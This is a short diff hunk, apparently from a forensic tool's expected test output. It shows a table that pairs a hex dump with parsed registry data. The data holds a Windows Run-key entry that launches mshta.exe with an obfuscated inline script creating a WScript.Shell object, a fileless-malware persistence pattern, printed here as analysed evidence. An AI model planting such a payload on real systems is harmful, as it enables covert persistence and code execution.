@@ -209,7 +209,7 @@ INFO:2018/09/28 21:29:10 Loaded 34 built in artifacts
 |            |      |      | 2 57  |ActiveXObject(\"W|","00 | \\Windows\\CurrentVersion\\Run |
 |            |      |      | 000010  53 63 72 69 70 74 2e 5 | \\\"C:\\Windows\\system32\\msh |
 |            |      |      | 3  68 65 6c 6c 22 29 3b 51  |S | ta.exe\"","Type":"SZ","Data":{ |
-|            |      |      | cript.Shell\");Q|","00000020   | "type":"SZ","value":"about:\u0 |
+|            |      |      | script.Shell\");Q|","00000020   | "type":"SZ","value":"about:\u0 |
 |            |      |      | 52 33 69 72 6f 55 66 3d  22 49 | 03cscript\u003ec1hop=\"X642N10 |
 |            |      |      |  37 70 4c 37 22 3b  |R3iroUf=\ | \";R3I=new%20ActiveXObject(\"W |
 |            |      |      | "I7pL7\";|","00000030  6b 39 5 | Script.Shell\");QR3iroUf=\"I7p |
